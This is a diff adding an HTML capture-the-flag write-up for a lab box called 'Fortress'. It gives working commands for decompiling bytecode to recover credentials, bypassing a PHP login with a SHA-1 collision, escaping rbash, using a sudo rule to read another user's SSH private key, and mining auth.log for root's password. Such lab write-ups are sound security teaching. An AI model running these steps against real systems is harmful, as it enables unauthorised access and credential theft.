@@ -1,0 +1,72 @@
+<!--
+  writeups/fortress.html - content fragment (loaded into the modal)
+  New writeup? Copy writeups/template.html -> writeups/<slug>.html.
+-->
+<h2>Fortress — SHA-1 Collision to Root</h2>
+<p>A story-driven box: decompile Python bytecode for credentials, talk to a telnet service, beat a SHA-1 collision login gate to win an SSH key, break out of a restricted shell, and read logs for root. Goal: user.txt + root.txt.</p>
+
+<h3>1 · Setup + Enumeration</h3>
+<pre><code><span class="tok-comment"># Map the two virtual hosts</span>
+<span class="tok-func">echo</span> "<span class="tok-string">10.10.x.x fortress temple.fortress</span>" &gt;&gt; /etc/hosts
+
+<span class="tok-func">nmap</span> -sC -sV -p- fortress
+PORT    STATE SERVICE
+22/tcp  open  ssh
+5581/tcp open  ftp    (anonymous)
+5752/tcp open  telnet
+7331/tcp open  http   Apache</code></pre>
+
+<h3>2 · FTP → Python Bytecode</h3>
+<p>Anonymous FTP hides <code>.file</code> — Python 2.7 compiled bytecode. Decompile it to see the telnet service's hardcoded username/password, stored as big integers via <code>bytes_to_long</code>.</p>
+<pre><code><span class="tok-func">ftp</span> fortress
+&gt; ls -la          <span class="tok-comment"># find .file</span>
+&gt; get .file
+
+<span class="tok-func">uncompyle6</span> .file
+<span class="tok-comment"># &gt; usern = bytes_to_long(b"...")  passw = bytes_to_long(b"...")</span>
+
+<span class="tok-comment"># Decode the longs back to strings</span>
+<span class="tok-keyword">from</span> Crypto.Util.number <span class="tok-keyword">import</span> long_to_bytes
+<span class="tok-func">print</span>(long_to_bytes(usern).decode(), long_to_bytes(passw).decode())</code></pre>
+
+<h3>3 · Telnet → Secret Page</h3>
+<pre><code><span class="tok-func">telnet</span> fortress <span class="tok-num">5752</span>
+<span class="tok-comment"># &gt; t3mple_0f_y0ur_51n5</span></code></pre>
+
+<h3>4 · SHA-1 Collision Gate</h3>
+<p>The <code>.html</code> version of that page shows its PHP source: it compares <code>user</code> and <code>pass</code> by SHA-1 (which must be identical) and also requires lengths &gt; 600 and &gt; 500 bytes. That's a SHA-1 collision — only a few known pairs exist.</p>
+<pre><code><span class="tok-keyword">import</span> requests
+c1 = requests.get(<span class="tok-string">"http://localhost/shattered-1.dat"</span>).content
+c2 = requests.get(<span class="tok-string">"http://localhost/shattered-2.dat"</span>).content
+r = requests.get(
+    <span class="tok-string">"http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php"</span>,
+    params={<span class="tok-string">'user'</span>: c1, <span class="tok-string">'pass'</span>: c2})
+<span class="tok-func">print</span>(r.text)
+<span class="tok-comment"># &gt; m0td_f0r_j4x0n.txt — an SSH private key left by h4rdy</span></code></pre>
+<p>The <code>shattered.io</code> PDFs are ~825KB — way over GET limits. Use pre-built collision files of ~640 bytes each (e.g. from the 2017 Boston Key Party Prudentialv2 writeup); they pass both length checks.</p>
+
+<h3>5 · SSH h4rdy — Restricted Shell Escape</h3>
+<p>h4rdy's shell is rbash: no <code>cd</code>, <code>export</code> or <code>sudo</code>. Force a real shell over SSH, fix PATH, then abuse the sudo rule.</p>
+<pre><code><span class="tok-func">chmod</span> <span class="tok-num">600</span> id_rsa
+<span class="tok-func">ssh</span> -t -i id_rsa h4rdy@fortress bash
+<span class="tok-func">export</span> PATH=<span class="tok-string">$PATH:/bin:/usr/bin</span>
+
+<span class="tok-comment"># h4rdy may run /bin/cat as j4x0n — steal the SSH key</span>
+<span class="tok-func">sudo</span> -u j4x0n /bin/cat /home/j4x0n/user.txt
+<span class="tok-func">sudo</span> -u j4x0n /bin/cat /home/j4x0n/.ssh/id_rsa</code></pre>
+
+<h3>6 · j4x0n → root (adm group)</h3>
+<pre><code><span class="tok-func">ssh</span> -i j4x0n_rsa j4x0n@fortress
+
+<span class="tok-comment"># j4x0n is in the adm group → system logs are readable</span>
+<span class="tok-func">id</span>
+groups=<span class="tok-num">1001</span>(j4x0n),<span class="tok-num">4</span>(adm)
+
+<span class="tok-func">grep</span> -iE <span class="tok-string">"password|passwd"</span> /var/log/auth.log
+<span class="tok-comment"># &gt; leaks root's credentials → su / ssh root</span>
+<span class="tok-func">su</span> root
+<span class="tok-func">cat</span> /root/root.txt</code></pre>
+<p><strong>Shortcut:</strong> <code>/data/setup.sh</code> — the box's own bootstrap script — writes the root flag as the root password, leaking it directly.</p>
+
+<h3>7 · Retrospective</h3>
+<p>Attack chain: anonymous FTP bytecode → long/bytes credential decode → telnet info leak → SHA-1 collision login → rbash escape → sudo-cat key theft → adm log read. Lessons: never stash compiled secrets in anonymous FTP, SHA-1 is broken for collisions, and restricted shells are an obfuscation — not a boundary.</p>
